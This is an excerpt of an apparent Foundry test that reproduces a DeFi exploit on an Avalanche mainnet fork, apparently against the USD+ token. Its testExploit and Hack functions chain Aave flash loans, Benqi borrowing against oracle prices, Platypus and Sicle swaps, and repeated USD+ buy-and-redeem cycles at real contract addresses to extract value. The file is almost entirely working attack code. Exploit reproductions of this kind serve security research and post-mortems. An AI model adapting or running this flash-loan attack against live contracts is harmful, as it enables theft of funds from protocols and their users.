...
contract ContractTest is Test {
    ...
    SicleRouter sicleRouter =
        SicleRouter(0xC7f372c62238f6a5b79136A9e5D16A2FD7A3f0F5);
    USDPlus USDplus = USDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
    SwapFlashLoan Swap =
        SwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);
    IAaveFlashloan LendingPoolV2 =
        IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);
    IAaveFlashloan PoolV3 =
        IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    BenqiFinance Benqi =
        BenqiFinance(0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4);
    BenqiChainlinkOracle Oracle =
    ...
    PlatypusFinance Platypus =
        PlatypusFinance(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    ...
    TotalNetAsset totalNetAsset =
        TotalNetAsset(0x9Af655c4DBe940962F776b685d6700F538B90fcf);
    ...
    function setUp() public {
        vm.createSelectFork("Avalanche", 23_097_846);
    }
    ...
    function testExploit() public payable {
        ...
        path[1] = address(USDC);
        Router.swapAVAXForExactTokens{value: 2830 ether}(
            amountBuy,
            path,
            address(this),
            block.timestamp
    ...
    function Hack() public {
        for (uint256 i = 0; i < 6; i++) {
            ...
            vm.roll(block.number + 1); // USD+ buy and redeem not allowed in one block
            // redeem USD+ to USDC
            if (
                (totalNetAsset.totalNetAssets() - netAsset.netAssetValue()) >
        ...
        path[1] = address(USDC);
        sicleRouter.swapExactTokensForTokens(
            USDPLUS.balanceOf(address(this)),
            0,
            path,
            address(this),
    ...
    function executeOperation(
        ...
        if (msg.sender == address(LendingPoolV2)) {
            ...
            (, uint256 accountLiquidity, ) = Benqi.getAccountLiquidity(
                address(this)
            );
            uint256 oraclePrice = Oracle.getUnderlyingPrice(address(qiUSDC)) /
                1e18;
            ...
            uint256 minToMint = (Swap.calculateTokenAmount(amount, true) * 99) /
                100;
            uint256 LPAmount = Swap.addLiquidity(
                amount,
                minToMint,
                block.timestamp
            );
            ...
            USDC_e.approve(
                address(qiUSDC),
                qiUSDC.borrowBalanceStored(address(this))
            );
            ...
            uint256 USDC_eSwapAmount = USDC_e.balanceOf(address(this)) -
                (PoolV2BorrowAmount / 9991) *
                10_000 +
                1000;
            Platypus.swap(
                address(USDC_e),
